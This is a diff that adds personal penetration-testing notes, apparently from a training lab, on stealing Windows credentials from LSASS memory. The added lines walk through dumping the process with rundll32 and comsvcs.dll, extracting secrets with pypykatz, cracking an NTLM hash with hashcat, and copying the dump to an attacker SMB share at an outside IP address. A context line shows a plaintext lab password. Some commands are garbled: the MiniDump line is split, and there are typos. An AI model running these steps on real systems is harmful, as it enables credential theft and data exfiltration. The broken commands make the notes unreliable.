@@ -42,3 +42,41 @@ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
 * DonPAPI
 
 # LSASS
+Local Security Authority Subsystem Service (LSASS)
+### Steps For the GUI
+1. Open Task Manager
+2. Select the process tab
+3. Right click the Local Security Authority Process
+4. Create dump file
+
+Then a file called lsass.DMP will be created in the temp folder
+
+### Steps for the CMD
+```powershell
+C:\Windows\system32> tasklist /svc
+
+# Now using the command below one can find the pid of the lsass process
+Get-Process lsass
+
+# Now using the rundll32.exe, we can all the comsvcs.dll
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672
+
+# Going the C:\lsoss.dmp file you can find the dump file of the lsass
+C:\lsass.dmp full
+```
+
+```bash
+# Once the dmp file is on our attacker box, we can use this file to capture the credentials
+pypykatz lsa minidump /home/peter/Documents/lsass.dmp
+
+# Look into the MSV, WDIGEST, DPAPI and Kerberos
+
+# The MSV can provide a password here
+sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
+```
+
+### File transfer
+```bash
+impacket-smbserver share $(pwd) -smb2support
+copy lsass.dmp \\192.168.31.141\share\lsass.dmp
+```
